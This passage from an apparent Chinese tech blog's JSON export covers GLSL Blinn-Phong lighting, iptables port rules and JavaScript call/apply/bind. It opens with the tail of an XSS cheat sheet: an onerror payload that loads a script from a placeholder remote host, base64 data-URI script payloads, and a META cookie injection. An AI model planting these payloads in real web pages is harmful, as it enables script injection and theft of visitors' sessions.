onerror=s=createElement('script');body.appendChild(s);s.src='http://xxx/xxx.js';>\n\n\n * Data URI 协议(IE不可用)\n   \n   <a>,<object>,<meta>\n   \n   \n\n  <a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\">test</a>  \n  <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\"></object>\n  <meta HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\" /> \n\n\n * link的href\n\n  <link rel=\"import\" href=\"https://www.xxx.com/xss\"></link> //一个xss页面就行\n\n\n * 其他\n   \n   设置cookie：\n   \n   <META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">\n   \n   \n   ​","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-12-19T10:53:13.000Z","created_by":"1","updated_at":"2016-12-19T10:54:42.000Z","updated_by":"1","published_at":"2016-12-19T10:54:42.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d308","uuid":"43d58a28-d164-444d-8662-3f7455cd7b42","title":"OpenGl学习2--Blinn-Phong光照模型","slug":"openglxue-xi-2-phongguang-zhao-mo-xing","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> VERTEX SHADER\\n```\\nprecision highp float;\\n\\n// Attributes\\nattribute vec3 position;\\nattribute vec3 normal;\\nattribute vec2 uv;\\n\\n// Uniforms\\nuniform mat4 worldViewProjection;\\n\\n// Varying\\nvarying vec3 vPosition;\\nvarying vec3 vNormal;\\nvarying vec2 vUV;\\n\\nvoid main(void) {\\n    vec4 outPosition = worldViewProjection * vec4(position, 1.0);\\n    gl_Position = outPosition;\\n    \\n    vUV = uv;\\n    vPosition = position;\\n    vNormal = normal;\\n}\\n```\\n> PIXEL (FRAGMENT) SHADER\\n```\\nprecision highp float;\\n\\n// Varying\\nvarying vec3 vPosition;\\nvarying vec3 vNormal;\\nvarying vec2 vUV;\\n\\n// Uniforms\\nuniform mat4 world;\\n\\n// Refs\\nuniform vec3 cameraPosition;\\nuniform sampler2D textureSampler;\\n\\nvoid main(void) {\\n    vec3 vLightPosition = vec3(0,20,40);\\n    \\n    // World values\\n    vec3 vPositionW = vec3(world * vec4(vPosition, 1.0));\\n    vec3 vNormalW = normalize(vec3(world * vec4(vNormal, 0.0)));\\n    vec3 viewDirectionW = normalize(cameraPosition - vPositionW);\\n    \\n    // Light\\n    vec3 lightVectorW = normalize(vLightPosition - vPositionW);\\n    vec3 color = texture2D(textureSampler, vUV).rgb;\\n    \\n    // diffuse\\n    float ndl = max(0., dot(vNormalW, lightVectorW));\\n    \\n    // Specular\\n    vec3 angleW = normalize(viewDirectionW + lightVectorW);\\n    float specComp = max(0., dot(vNormalW, angleW));\\n    specComp = pow(specComp, max(1., 64.)) * 2.;\\n    \\n    gl_FragColor = vec4(color * ndl + vec3(specComp), 1.);\\n}\\n```\\nBlinn-Phong是一种简化的PHong模型。\\nBlinn-Phong模型很大程度上和Phong是相似的，不过它稍微改进了Phong模型，使之能够克服我们所讨论到的问题。它放弃使用反射向量，而是基于我们现在所说的一个叫做半程向量（halfway vector）的向量，这是个单位向量，它在视线方向和光线方向的中间。半程向量和表面法线向量越接近，镜面反射成份就越大。转自[高级光照](https://learnopengl-cn.readthedocs.io/zh/latest/05%20Advanced%20Lighting/01%20Advanced%20Lighting/)。\\n![](/content/images/2016/12/advanced_lighting_halfway_vector.png)\\n\\n\\n先从vertex shader（点着色器）看起，uniform是application的输入。worldViewProjection是一个mat4的世界-视图-投影矩阵。这里的vertex shader是一个平常的，没有位置变幻等操作。主要是向PIXEL传递了uv（vec2纹理坐标），position（vec3点坐标），normal（vec3法向量）。\\n\\nPIXEL SHADER中。这个mat4 ==world==是一个世界矩阵。vec3 ==cameraPosition==相机的坐标，sampler2D ==textureSampler==二维纹理\\n\\nvec3 vLightPosition是光源的坐标。\\n\\n`vec3 vPositionW = vec3(world * vec4(vPosition, 1.0));`这里当前点的坐标乘以世界矩阵，即可得世界坐标系中光源的坐标，（3D世界为啥要用vec4呢，是因为在解决3d数学问题时，是用4维空间的方式解决的，避免了万向锁的问题。）\\n\\n`vec3 vNormalW = normalize(vec3(world * vec4(vNormal, 0.0)));`同样是，把法向量转换成世界坐标系的模向量，normalize转换成模向量。\\n\\n`vec3 viewDirectionW = normalize(cameraPosition - vPositionW);`相机的坐标减当前点的世界坐标，就是向量。然后求模。\\n\\n`vec3 lightVectorW = normalize(vLightPosition - vPositionW);`当前点坐标到灯光坐标的模向量\\n\\n`vec3 color = texture2D(textureSampler, vUV).rgb;`当前原始的颜色。// texture2D 返回类型的精度为lowp是一个四维向量。`.rgb`是把前3个值赋值给color:vec3向量。一共是`rgba`4个维度。同理`.rga`就是取第1，2，4维度的值。\\n\\n`float ndl = max(0., dot(vNormalW, lightVectorW));`求法向量与lightVectorW向量的点积。点积不是一个向量了，他是一个常数（float）。点积还可以判断向量之间的夹角，等于0，则两向量垂直，大于0为锐角，小于0为钝角。还有cross叉积。这里ndl是与0对比的最大值。与法向量为钝角时，则是光照在背面。即没有光照。则颜色vec3向量乘以0，为黑色。dot(vNormalW, lightVectorW)就是这两个向量夹角的cos值,vNormalW,lightVectorW都是模为1的向量。ndl是一个[0,1)之间。\\n![](/content/images/2016/04/-C-FOX8P---93-D-PBI-HTQ.png)\\n\\n`vec3 angleW = normalize(viewDirectionW + lightVectorW);`求半程向量。\\n\\n`float specComp = max(0., dot(vNormalW, angleW));`同上。\\n\\n`specComp = pow(specComp, max(1., 64.)) * 2.;` 这是Blinn-Phong的计算公式。\\n\\n`gl_FragColor = vec4(color * ndl + vec3(specComp), 1.);`得出最终color。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>VERTEX SHADER</p>\n</blockquote>\n<pre><code>precision highp float;\n\n// Attributes\nattribute vec3 position;\nattribute vec3 normal;\nattribute vec2 uv;\n\n// Uniforms\nuniform mat4 worldViewProjection;\n\n// Varying\nvarying vec3 vPosition;\nvarying vec3 vNormal;\nvarying vec2 vUV;\n\nvoid main(void) {\n    vec4 outPosition = worldViewProjection * vec4(position, 1.0);\n    gl_Position = outPosition;\n    \n    vUV = uv;\n    vPosition = position;\n    vNormal = normal;\n}\n</code></pre>\n<blockquote>\n<p>PIXEL (FRAGMENT) SHADER</p>\n</blockquote>\n<pre><code>precision highp float;\n\n// Varying\nvarying vec3 vPosition;\nvarying vec3 vNormal;\nvarying vec2 vUV;\n\n// Uniforms\nuniform mat4 world;\n\n// Refs\nuniform vec3 cameraPosition;\nuniform sampler2D textureSampler;\n\nvoid main(void) {\n    vec3 vLightPosition = vec3(0,20,40);\n    \n    // World values\n    vec3 vPositionW = vec3(world * vec4(vPosition, 1.0));\n    vec3 vNormalW = normalize(vec3(world * vec4(vNormal, 0.0)));\n    vec3 viewDirectionW = normalize(cameraPosition - vPositionW);\n    \n    // Light\n    vec3 lightVectorW = normalize(vLightPosition - vPositionW);\n    vec3 color = texture2D(textureSampler, vUV).rgb;\n    \n    // diffuse\n    float ndl = max(0., dot(vNormalW, lightVectorW));\n    \n    // Specular\n    vec3 angleW = normalize(viewDirectionW + lightVectorW);\n    float specComp = max(0., dot(vNormalW, angleW));\n    specComp = pow(specComp, max(1., 64.)) * 2.;\n    \n    gl_FragColor = vec4(color * ndl + vec3(specComp), 1.);\n}\n</code></pre>\n<p>Blinn-Phong是一种简化的PHong模型。<br>\nBlinn-Phong模型很大程度上和Phong是相似的，不过它稍微改进了Phong模型，使之能够克服我们所讨论到的问题。它放弃使用反射向量，而是基于我们现在所说的一个叫做半程向量（halfway vector）的向量，这是个单位向量，它在视线方向和光线方向的中间。半程向量和表面法线向量越接近，镜面反射成份就越大。转自<a href=\"https://learnopengl-cn.readthedocs.io/zh/latest/05%20Advanced%20Lighting/01%20Advanced%20Lighting/\">高级光照</a>。<br>\n<img src=\"/content/images/2016/12/advanced_lighting_halfway_vector.png\" alt=\"\"></p>\n<p>先从vertex shader（点着色器）看起，uniform是application的输入。worldViewProjection是一个mat4的世界-视图-投影矩阵。这里的vertex shader是一个平常的，没有位置变幻等操作。主要是向PIXEL传递了uv（vec2纹理坐标），position（vec3点坐标），normal（vec3法向量）。</p>\n<p>PIXEL SHADER中。这个mat4 <mark>world</mark>是一个世界矩阵。vec3 <mark>cameraPosition</mark>相机的坐标，sampler2D <mark>textureSampler</mark>二维纹理</p>\n<p>vec3 vLightPosition是光源的坐标。</p>\n<p><code>vec3 vPositionW = vec3(world * vec4(vPosition, 1.0));</code>这里当前点的坐标乘以世界矩阵，即可得世界坐标系中光源的坐标，（3D世界为啥要用vec4呢，是因为在解决3d数学问题时，是用4维空间的方式解决的，避免了万向锁的问题。）</p>\n<p><code>vec3 vNormalW = normalize(vec3(world * vec4(vNormal, 0.0)));</code>同样是，把法向量转换成世界坐标系的模向量，normalize转换成模向量。</p>\n<p><code>vec3 viewDirectionW = normalize(cameraPosition - vPositionW);</code>相机的坐标减当前点的世界坐标，就是向量。然后求模。</p>\n<p><code>vec3 lightVectorW = normalize(vLightPosition - vPositionW);</code>当前点坐标到灯光坐标的模向量</p>\n<p><code>vec3 color = texture2D(textureSampler, vUV).rgb;</code>当前原始的颜色。// texture2D 返回类型的精度为lowp是一个四维向量。<code>.rgb</code>是把前3个值赋值给color:vec3向量。一共是<code>rgba</code>4个维度。同理<code>.rga</code>就是取第1，2，4维度的值。</p>\n<p><code>float ndl = max(0., dot(vNormalW, lightVectorW));</code>求法向量与lightVectorW向量的点积。点积不是一个向量了，他是一个常数（float）。点积还可以判断向量之间的夹角，等于0，则两向量垂直，大于0为锐角，小于0为钝角。还有cross叉积。这里ndl是与0对比的最大值。与法向量为钝角时，则是光照在背面。即没有光照。则颜色vec3向量乘以0，为黑色。dot(vNormalW, lightVectorW)就是这两个向量夹角的cos值,vNormalW,lightVectorW都是模为1的向量。ndl是一个[0,1)之间。<br>\n<img src=\"/content/images/2016/04/-C-FOX8P---93-D-PBI-HTQ.png\" alt=\"\"></p>\n<p><code>vec3 angleW = normalize(viewDirectionW + lightVectorW);</code>求半程向量。</p>\n<p><code>float specComp = max(0., dot(vNormalW, angleW));</code>同上。</p>\n<p><code>specComp = pow(specComp, max(1., 64.)) * 2.;</code> 这是Blinn-Phong的计算公式。</p>\n<p><code>gl_FragColor = vec4(color * ndl + vec3(specComp), 1.);</code>得出最终color。</p>\n<!--kg-card-end: markdown-->","comment_id":"75","plaintext":"> VERTEX SHADER\n\n\nprecision highp float;\n\n// Attributes\nattribute vec3 position;\nattribute vec3 normal;\nattribute vec2 uv;\n\n// Uniforms\nuniform mat4 worldViewProjection;\n\n// Varying\nvarying vec3 vPosition;\nvarying vec3 vNormal;\nvarying vec2 vUV;\n\nvoid main(void) {\n    vec4 outPosition = worldViewProjection * vec4(position, 1.0);\n    gl_Position = outPosition;\n    \n    vUV = uv;\n    vPosition = position;\n    vNormal = normal;\n}\n\n\n> PIXEL (FRAGMENT) SHADER\n\n\nprecision highp float;\n\n// Varying\nvarying vec3 vPosition;\nvarying vec3 vNormal;\nvarying vec2 vUV;\n\n// Uniforms\nuniform mat4 world;\n\n// Refs\nuniform vec3 cameraPosition;\nuniform sampler2D textureSampler;\n\nvoid main(void) {\n    vec3 vLightPosition = vec3(0,20,40);\n    \n    // World values\n    vec3 vPositionW = vec3(world * vec4(vPosition, 1.0));\n    vec3 vNormalW = normalize(vec3(world * vec4(vNormal, 0.0)));\n    vec3 viewDirectionW = normalize(cameraPosition - vPositionW);\n    \n    // Light\n    vec3 lightVectorW = normalize(vLightPosition - vPositionW);\n    vec3 color = texture2D(textureSampler, vUV).rgb;\n    \n    // diffuse\n    float ndl = max(0., dot(vNormalW, lightVectorW));\n    \n    // Specular\n    vec3 angleW = normalize(viewDirectionW + lightVectorW);\n    float specComp = max(0., dot(vNormalW, angleW));\n    specComp = pow(specComp, max(1., 64.)) * 2.;\n    \n    gl_FragColor = vec4(color * ndl + vec3(specComp), 1.);\n}\n\n\nBlinn-Phong是一种简化的PHong模型。\nBlinn-Phong模型很大程度上和Phong是相似的，不过它稍微改进了Phong模型，使之能够克服我们所讨论到的问题。它放弃使用反射向量，而是基于我们现在所说的一个叫做半程向量（halfway\nvector）的向量，这是个单位向量，它在视线方向和光线方向的中间。半程向量和表面法线向量越接近，镜面反射成份就越大。转自高级光照\n[https://learnopengl-cn.readthedocs.io/zh/latest/05%20Advanced%20Lighting/01%20Advanced%20Lighting/]\n。\n\n\n先从vertex\nshader（点着色器）看起，uniform是application的输入。worldViewProjection是一个mat4的世界-视图-投影矩阵。这里的vertex\nshader是一个平常的，没有位置变幻等操作。主要是向PIXEL传递了uv（vec2纹理坐标），position（vec3点坐标），normal（vec3法向量）。\n\nPIXEL SHADER中。这个mat4 world是一个世界矩阵。vec3 cameraPosition相机的坐标，sampler2D \ntextureSampler二维纹理\n\nvec3 vLightPosition是光源的坐标。\n\nvec3 vPositionW = vec3(world * vec4(vPosition, 1.0));\n这里当前点的坐标乘以世界矩阵，即可得世界坐标系中光源的坐标，（3D世界为啥要用vec4呢，是因为在解决3d数学问题时，是用4维空间的方式解决的，避免了万向锁的问题。）\n\nvec3 vNormalW = normalize(vec3(world * vec4(vNormal, 0.0)));\n同样是，把法向量转换成世界坐标系的模向量，normalize转换成模向量。\n\nvec3 viewDirectionW = normalize(cameraPosition - vPositionW);\n相机的坐标减当前点的世界坐标，就是向量。然后求模。\n\nvec3 lightVectorW = normalize(vLightPosition - vPositionW);当前点坐标到灯光坐标的模向量\n\nvec3 color = texture2D(textureSampler, vUV).rgb;当前原始的颜色。// texture2D\n返回类型的精度为lowp是一个四维向量。.rgb是把前3个值赋值给color:vec3向量。一共是rgba4个维度。同理.rga就是取第1，2，4维度的值。\n\nfloat ndl = max(0., dot(vNormalW, lightVectorW));\n求法向量与lightVectorW向量的点积。点积不是一个向量了，他是一个常数（float）。点积还可以判断向量之间的夹角，等于0，则两向量垂直，大于0为锐角，小于0为钝角。还有cross叉积。这里ndl是与0对比的最大值。与法向量为钝角时，则是光照在背面。即没有光照。则颜色vec3向量乘以0，为黑色。dot(vNormalW,\nlightVectorW)就是这两个向量夹角的cos值,vNormalW,lightVectorW都是模为1的向量。ndl是一个[0,1)之间。\n\n\nvec3 angleW = normalize(viewDirectionW + lightVectorW);求半程向量。\n\nfloat specComp = max(0., dot(vNormalW, angleW));同上。\n\nspecComp = pow(specComp, max(1., 64.)) * 2.; 这是Blinn-Phong的计算公式。\n\ngl_FragColor = vec4(color * ndl + vec3(specComp), 1.);得出最终color。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-12-22T08:12:03.000Z","created_by":"1","updated_at":"2016-12-23T06:31:40.000Z","updated_by":"1","published_at":"2016-12-23T06:31:40.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d309","uuid":"508baca7-327e-414a-9831-8f7708eaf18d","title":"ubuntu下iptables开启端口","slug":"ubuntuxia-iptableskai-qi-duan-kou","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"root@vps:~/dadigua# iptables -A INPUT -i eth0 -p tcp -m tcp --dport 8080 -j ACCEPT                                                                                                                                                                                \\nroot@vps:~/dadigua# iptables-save > /etc/network/iptables.up.rules                                                                                                                                                                                                \\nroot@vps:~/dadigua# iptables-apply\\n\\n```\\n*filter\\n:INPUT DROP [0:0]\\n:FORWARD ACCEPT [0:0]\\n:OUTPUT ACCEPT [0:0]\\n:syn-flood - [0:0]\\n-A INPUT -i lo -j ACCEPT\\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT\\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT\\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT\\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT\\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080 -j ACCEPT\\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 23456 -j ACCEPT\\n-A INPUT -p icmp -m limit --limit 100/sec --limit-burst 100 -j ACCEPT\\n-A INPUT -p icmp -m limit --limit 1/s --limit-burst 10 -j ACCEPT\\n-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j syn-flood\\n-A INPUT -j REJECT --reject-with icmp-host-prohibited\\n-A syn-flood -p tcp -m limit --limit 3/sec --limit-burst 6 -j RETURN\\n-A syn-flood -j REJECT --reject-with icmp-port-unreachable\\nCOMMIT\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>root@vps:~/dadigua# iptables -A INPUT -i eth0 -p tcp -m tcp --dport 8080 -j ACCEPT<br>\nroot@vps:~/dadigua# iptables-save &gt; /etc/network/iptables.up.rules<br>\nroot@vps:~/dadigua# iptables-apply</p>\n<pre><code>*filter\n:INPUT DROP [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n:syn-flood - [0:0]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 23456 -j ACCEPT\n-A INPUT -p icmp -m limit --limit 100/sec --limit-burst 100 -j ACCEPT\n-A INPUT -p icmp -m limit --limit 1/s --limit-burst 10 -j ACCEPT\n-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j syn-flood\n-A INPUT -j REJECT --reject-with icmp-host-prohibited\n-A syn-flood -p tcp -m limit --limit 3/sec --limit-burst 6 -j RETURN\n-A syn-flood -j REJECT --reject-with icmp-port-unreachable\nCOMMIT\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"76","plaintext":"root@vps:~/dadigua# iptables -A INPUT -i eth0 -p tcp -m tcp --dport 8080 -j\nACCEPT\nroot@vps:~/dadigua# iptables-save > /etc/network/iptables.up.rules\nroot@vps:~/dadigua# iptables-apply\n\n*filter\n:INPUT DROP [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n:syn-flood - [0:0]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080 -j ACCEPT\n-A INPUT -p tcp -m state --state NEW -m tcp --dport 23456 -j ACCEPT\n-A INPUT -p icmp -m limit --limit 100/sec --limit-burst 100 -j ACCEPT\n-A INPUT -p icmp -m limit --limit 1/s --limit-burst 10 -j ACCEPT\n-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j syn-flood\n-A INPUT -j REJECT --reject-with icmp-host-prohibited\n-A syn-flood -p tcp -m limit --limit 3/sec --limit-burst 6 -j RETURN\n-A syn-flood -j REJECT --reject-with icmp-port-unreachable\nCOMMIT","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-12-26T08:21:29.000Z","created_by":"1","updated_at":"2017-02-20T09:44:13.000Z","updated_by":"1","published_at":"2017-01-17T09:23:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d30a","uuid":"5205206a-c3c6-4270-bb38-6e0312ff4eac","title":"js--call、apply、bind","slug":"js-call-apply-bind","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"先科普一下\\n```\\nvar A = function(){  \\nconsole.log(this===window)  \\n}\\nA() // true this是window  \\nnew A()//false 这里this是A的一个实例this instanceof A  :true  \\n```\\n一个函数执行和把它当构造函数执行是完全不同的，比如A()和new A()一样。\\n\\n一个函数的上下文this从外层拿，外层没有就到更外层，反正在全局环境中this=window。\\n\\n> 1.call和apply\\n\\ncall:改变上下文this，并执行函数，apply也是一样。\\n`var fn=function(arg1,arg2){}\\nfn.call(obj,arg1,arg2)`\\n把obj这个对象，当做fn函数的this。并执行fn()\\n```\\nfunction add(a,b)  \\n{  \\n  alert(this.name);  \\n}  \\nvar obj={name:'我是obj'}  \\nadd.call(obj,3,1);//等于add.apply(obj,[3,1]);  \\n```\\n同理apply只是把fn参数，放在一个数组中。\\n\\n这样可以用来实现继承：\\n```\\nfunction Animal(name){  \\n  this.name = name;      \\n  this.showName = function(){      \\n    alert(this.name);      \\n  }      \\n}      \\nfunction Cat(name){  \\n  Animal.call(this, name);  //把Animal中的this换成Cat的实例(this)。并执行Animal。    \\n}      \\nvar cat = new Cat(\\\"Black Cat\\\");  \\ncat.showName();  \\n```\\n\\n> 2.bind\\n\\nbind和call只有一点区别，都改变上下文this，但是bind不执行，而是返回改变this后的函数。\\n```\\nvar temp=(function add(a,b)  \\n{  \\n  alert(this.name);  \\n}).bind({name:'我是obj'}) \\ntemp();  \\n```\\nbind不仅可以改变this。还可以绑定参数。\\n```\\nvar add=function(a,b){ console.log(a,b); alert(this.name); }  \\nvar temp=add.bind({name:'我是obj'},1);  \\ntemp(3);    //输出1,3  \\nvar temp2=add.bind({name:'我是obj'},8,9);  \\ntemp2(1,3)  //输出8,9  \\n```\\n\\n总结，call、apply、bind这些改变一个函数this的用法，还是很有用的。不然，就要把this用变量保存，利用函数作用域来，把this传入函数。\\n```\\nfunction Cat(name){  \\n    this.name=name;\\n    this.age=0;\\n    setInterval(function(){\\n         this.age++\\n    },1000)\\n}\\nvar cat=new Cat('花花');  \\n```\\n乍一看，这个实例cat的年龄是一秒加1；但是setInterval(function(){this.age++},1000)中的this是指window。不是cat（匿名函数的this一般指向window,setInterval=window.setInterval）。\\n```\\nfunction Cat(name){  \\n    this.name=name;\\n    this.age=0;\\n    setInterval(function(){\\n         this.age++\\n    }.bind(this),1000)\\n}\\nvar cat=new Cat('花花');这只猫的年龄，终于随时间增长了  \\n/////////\\nfunction Cat(name){  \\n    this.name=name;\\n    this.age=0;\\n    var that=this;\\n    setInterval(function(){  \\n         that.age++\\n    },1000)\\n}\\nvar cat=new Cat('花花')//这样也行  \\n/////////\\nfunction Cat(name){  \\n    this.name=name;\\n    this.age=0;\\n    var that=this;\\n    setInterval(()=>{  \\n         that.age++\\n    },1000)\\n}\\nvar cat=new Cat('花花')//箭头函数自动绑定了this  \\n```\\n\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>先科普一下</p>\n<pre><code>var A = function(){  \nconsole.log(this===window)  \n}\nA() // true this是window  \nnew A()//false 这里this是A的一个实例this instanceof A  :true  \n</code></pre>\n<p>一个函数执行和把它当构造函数执行是完全不同的，比如A()和new A()一样。</p>\n<p>一个函数的上下文this从外层拿，外层没有就到更外层，反正在全局环境中this=window。</p>\n<blockquote>\n<p>1.call和apply</p>\n</blockquote>\n<p>call:改变上下文this，并执行函数，apply也是一样。<br>\n<code>var fn=function(arg1,arg2){} fn.call(obj,arg1,arg2)</code><br>\n把obj这个对象，当做fn函数的this。并执行fn()</p>\n<pre><code>function add(a,b)  \n{  \n  alert(this.name);  \n}  \nvar obj={name:'我是obj'}  \nadd.call(obj,3,1);//等于add.apply(obj,[3,1]);  \n</code></pre>\n<p>同理apply只是把fn参数，放在一个数组中。</p>\n<p>这样可以用来实现继承：</p>\n<pre><code>function Animal(name){  \n  this.name = name;      \n  this.showName = function(){      \n    alert(this.name);      \n  }      \n}      \nfunction Cat(name){  \n  Animal.call(this, name);  //把Animal中的this换成Cat的实例(this)。并执行Animal。    \n}      \nvar cat = new Cat(&quot;Black Cat&quot;);  \ncat.showName();  \n</code></pre>\n<blockquote>\n<p>2.bind</p>\n</blockquote>\n<p>bind和call只有一点区别，都改变上下文this，但是bind不执行，而是返回改变this后的函数。</p>\n<pre><code>var temp=(function add(a,b)  \n{  \n  alert(this.name);  \n}).bind({name:'我是obj'}) \ntemp();  \n</code></pre>\n<p>bind不仅可以改变this。还可以绑定参数。</p>\n<pre><code>var add=function(a,b){ console.log(a,b); alert(this.name); }  \nvar temp=add.bind({name:'我是obj'},1);  \ntemp(3);    //输出1,3  \nvar temp2=add.bind({name:'我是obj'},8,9);  \ntemp2(1,3)  //输出8,9  \n</code></pre>\n<p>总结，call、apply、bind这些改变一个函数this的用法，还是很有用的。不然，就要把this用变量保存，利用函数作用域来，把this传入函数。</p>\n<pre><code>function Cat(name){  \n    this.name=name;\n    this.age=0;\n    setInterval(function(){\n         this.age++\n    },1000)\n}\nvar cat=new Cat('花花');  \n</code></pre>\n<p>乍一看，这个实例cat的年龄是一秒加1；但是setInterval(function(){this.age++},1000)中的this是指window。不是cat（匿名函数的this一般指向window,setInterval=window.setInterval）。</p>\n<pre><code>function Cat(name){  \n    this.name=name;\n    this.age=0;\n    setInterval(function(){\n         this.age++\n    }.bind(this),1000)\n}\nvar cat=new Cat('花花');这只猫的年龄，终于随时间增长了  \n/////////\nfunction Cat(name){  \n    this.name=name;\n    this.age=0;\n    var that=this;\n    setInterval(function(){  \n         that.age++\n    },1000)\n}\nvar cat=new Cat('花花')//这样也行  \n/////////\nfunction Cat(name){  \n    this.name=name;\n    this.age=0;\n    var that=this;\n    setInterval(()=&gt;{  \n         that.age++\n    },1000)\n}\nvar cat=new Cat('花花')//箭头函数自动绑定了this  \n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"77","plaintext":"先科普一下\n\nvar A = function(){  \nconsole.log(this===window)  \n}\nA() // true this是window  \nnew A()//false 这里this是A的一个实例this instanceof A  :true  \n\n\n一个函数执行和把它当构造函数执行是完全不同的，比如A()和new A()一样。\n\n一个函数的上下文this从外层拿，外层没有就到更外层，反正在全局环境中this=window。\n\n> 1.call和apply\n\n\ncall:改变上下文this，并执行函数，apply也是一样。\nvar fn=function(arg1,arg2){} fn.call(obj,arg1,arg2)\n把obj这个对象，当做fn函数的this。并执行fn()\n\nfunction add(a,b)  \n{  \n  alert(this.name);  \n}  \nvar obj={name:'我是obj'}  \nadd.call(obj,3,1);//等于add.apply(obj,[3,1]);  \n\n\n同理apply只是把fn参数，放在一个数组中。\n\n这样可以用来实现继承：\n\nfunction Animal(name){  \n  this.name = name;      \n  this.showName = function(){      \n    alert(this.name);      \n  }      \n}      \nfunction Cat(name){  \n  Animal.call(this, name);  //把Animal中的this换成Cat的实例(this)。并执行Animal。    \n}      \nvar cat = new Cat(\"Black Cat\");  \ncat.showName();  \n\n\n> 2.bind\n\n\nbind和call只有一点区别，都改变上下文this，但是bind不执行，而是返回改变this后的函数。\n\nvar temp=(function add(a,b)  \n{  \n  alert(this.name);  \n}).bind({name:'我是obj'}) \ntemp();  \n\n\nbind不仅可以改变this。还可以绑定参数。\n\nvar add=function(a,b){ console.log(a,b); alert(this.name); }  \nvar temp=add.bind({name:'我是obj'},1);  \ntemp(3);    //输出1,3  \nvar temp2=add.bind({name:'我是obj'},8,9);  \ntemp2(1,3)  //输出8,9  \n\n\n总结，call、apply、bind这些改变一个函数this的用法，还是很有用的。不然，就要把this用变量保存，利用函数作用域来，把this传入函数。\n\nfunction Cat(name){  \n    this.name=name;\n    this.age=0;\n    setInterval(function(){\n         this.age++\n    },1000)\n}\nvar cat=new Cat('花花');  \n\n\n乍一看，这个实例cat的年龄是一秒加1；但是setInterval(function(){this.age++},1000)中的this是指window。不是cat（匿名函数的this一般指向window,setInterval=window.setInterval）。\n\nfunction Cat(name){  \n    this.name=name;\n    this.age=0;\n    setInterval(function(){\n         this.age++\n    }.bind(this),1000)\n}\nvar cat=new Cat('花花');这只猫的年龄，终于随时间增长了  \n/////////\nfunction Cat(name){  \n    this.name=name;\n    this.age=0;\n    var that=this;\n    setInterval(function(){  \n         that.age++\n    },1000)\n}\nvar cat=new Cat('花花')//这样也行  \n/////////\nfunction Cat(name){  \n    this.name=name;\n    this.age=0;\n    var that=this;\n    setInterval(()=>{  \n         that.age++\n    },1000)\n}\nvar cat=new 